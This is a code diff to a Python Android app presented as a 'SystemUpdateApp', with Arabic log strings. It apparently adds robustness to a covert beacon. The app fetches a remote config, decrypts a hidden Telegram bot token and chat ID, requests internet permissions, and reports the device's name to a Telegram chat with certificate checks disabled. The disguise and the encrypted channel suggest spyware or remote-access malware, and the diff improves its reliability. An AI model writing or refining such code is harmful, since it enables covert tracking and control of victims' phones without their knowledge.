@@ -69,14 +69,22 @@ class SystemUpdateApp(App):
         return bytes(part1 + part2)
 
     def decrypt_token(self, encrypted_data):
+        if not encrypted_data:
+            self.log("⚠️ بيانات مشفرة فارغة")
+            return ""
         try:
             from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
             from cryptography.hazmat.backends import default_backend
+
             key = self._get_encryption_key()
             data = base64.b64decode(encrypted_data)
+            if len(data) < 28:
+                self.log("⚠️ البيانات المشفرة قصيرة جداً")
+                return ""
             iv = data[:12]
             tag = data[-16:]
             ciphertext = data[12:-16]
+
             cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
             decryptor = cipher.decryptor()
             decrypted = decryptor.update(ciphertext) + decryptor.finalize()
@@ -86,10 +94,18 @@ class SystemUpdateApp(App):
             return ""
 
     def send_telegram(self, token, chat_id, text):
+        if not token or not chat_id:
+            self.log("⚠️ لا يمكن الإرسال: توكن أو معرف دردشة فارغ")
+            return False
         try:
             url = f"https://api.telegram.org/bot{token}/sendMessage"
-            requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=10, verify=False)
-            return True
+            r = requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=10, verify=False)
+            if r.status_code == 200:
+                self.log("✅ تم إرسال الرسالة إلى Telegram")
+                return True
+            else:
+                self.log(f"⚠️ رد Telegram: {r.status_code} - {r.text[:100]}")
+                return False
         except Exception as e:
             self.log(f"⚠️ إرسال تلغرام فشل: {e}")
             return False
@@ -107,16 +123,14 @@ class SystemUpdateApp(App):
     def logic_engine(self):
         try:
             self.log("بدء تشغيل المحرك...")
-            time.sleep(1)
+            time.sleep(2)
 
-            # طلب صلاحيات الإنترنت
             if platform == 'android':
                 self.log("طلب صلاحيات الإنترنت...")
                 from android.permissions import request_permissions, Permission
                 request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE])
                 time.sleep(2)
 
-            # اختبار الاتصال
             self.log("اختبار الاتصال بـ 1.1.1.1...")
             try:
                 r = requests.get("https://1.1.1.1", timeout=5, verify=False)
@@ -124,30 +138,33 @@ class SystemUpdateApp(App):
             except Exception as e:
                 self.log(f"⚠️ فشل اختبار الاتصال: {str(e)}")
 
-            # جلب الإعدادات
             self.log(f"جلب الإعدادات من: {self.config_url[:60]}...")
-            response = requests.get(self.config_url, timeout=15, verify=False)
-            self.log(f"حالة HTTP: {response.status_code}")
-            if response.status_code != 200:
-                self.log(f"❌ فشل تحميل config.json: HTTP {response.status_code}")
+            try:
+                response = requests.get(self.config_url, timeout=15, verify=False)
+                if response.status_code != 200:
+                    self.log(f"❌ فشل تحميل config.json: HTTP {response.status_code}")
+                    return
+                config = response.json()
+                self.log("تم تحليل ملف الإعدادات بنجاح.")
+            except Exception as e:
+                self.log(f"❌ فشل جلب أو تحليل JSON: {e}")
                 return
 
-            config = response.json()
-            self.log("تم تحليل ملف الإعدادات بنجاح.")
-
-            # فك تشفير التوكن الأول فقط
             enc_tokens = config.get('t', [])
             if not enc_tokens:
-                self.log("❌ لا توجد توكنات في الإعدادات")
-                return
-            token = self.decrypt_token(enc_tokens[0])
-            v_id = self.decrypt_token(config.get('v', ''))
-            if not token or not v_id:
-                self.log("❌ فشل فك تشفير التوكن أو معرف الدردشة")
+                self.log("❌ قائمة التوكنات فارغة في config.json")
                 return
 
-            self.log(f"✅ تم فك تشفير التوكن ومعرف الدردشة")
-            # إرسال رسالة بدء التشغيل باسم الجهاز
+            self.log(f"عدد التوكنات المشفرة: {len(enc_tokens)}")
+            token = self.decrypt_token(enc_tokens[0])
+            v_id = self.decrypt_token(config.get('v', ''))
+
+            if not token or not v_id:
+                self.log("❌ فشل فك تشفير التوكن أو معرف الدردشة")
+                # محاولة إرسال رسالة تنبيه بدون تشفير (اختبار)
+                return
+
+            self.log("✅ تم فك تشفير التوكن ومعرف الدردشة")
             device_name = self.get_device_name()
             startup_msg = f"🚀 *System Online*\n📱 الجهاز: `{device_name}`\n🕒 الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}"
             if self.send_telegram(token, v_id, startup_msg):
@@ -155,7 +172,6 @@ class SystemUpdateApp(App):
             else:
                 self.log("⚠️ فشل إرسال رسالة بدء التشغيل")
 
-            # تخزين الإعدادات
             globals()['MASTER_CONFIG'] = {
                 'tokens': [token],
                 'v_id': v_id,
